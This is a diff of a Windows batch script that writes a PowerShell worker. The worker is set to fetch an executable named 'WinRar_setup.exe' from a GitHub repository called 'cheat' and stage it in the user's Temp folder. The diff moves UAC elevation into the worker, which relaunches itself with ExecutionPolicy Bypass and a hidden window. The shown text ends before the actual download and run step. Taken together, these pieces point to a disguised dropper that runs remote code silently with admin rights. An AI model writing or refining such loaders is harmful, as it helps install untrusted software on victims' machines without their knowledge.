@@ -1,14 +1,6 @@
 @echo off
 setlocal EnableExtensions
 
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    set "SELF_PATH=%~f0"
-    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-        "$p = $env:SELF_PATH -replace \"'\", \"''\"; Start-Process -FilePath 'cmd.exe' -ArgumentList \"/c `\"`$p`\"\" -Verb RunAs" >nul 2>&1
-    exit /b 0
-)
-
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
 set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
 set "BASE_TEMP=%USERPROFILE%\AppData\Local\Temp"
@@ -22,6 +14,7 @@ if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1
 > "%PS_SCRIPT%" (
   echo $ErrorActionPreference = 'Stop'
   echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  echo.
   echo $u = $env:URL
   echo $h = $env:HASH.ToLowerInvariant^(^)
   echo $dir = $env:WORK_DIR
@@ -34,8 +27,21 @@ if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1
   echo     Add-Content -LiteralPath $log -Value $line -Encoding UTF8
   echo }
   echo.
+  echo $isAdmin = ^([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent^(^)^).IsInRole^([Security.Principal.WindowsBuiltInRole]::Administrator^)
+  echo if ^(-not $isAdmin^) {
+  echo     $argList = @(
+  echo         '-NoProfile'
+  echo         '-NonInteractive'
+  echo         '-ExecutionPolicy', 'Bypass'
+  echo         '-WindowStyle', 'Hidden'
+  echo         '-File', "`"$psFile`""
+  echo     ^)
+  echo     Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -Verb RunAs -WindowStyle Hidden
+  echo     exit 0
+  echo }
+  echo.
   echo try {
-  echo     Write-Log "Start worker. URL=$u"
+  echo     Write-Log "Elevated worker started. URL=$u"
   echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
   echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
   echo     }
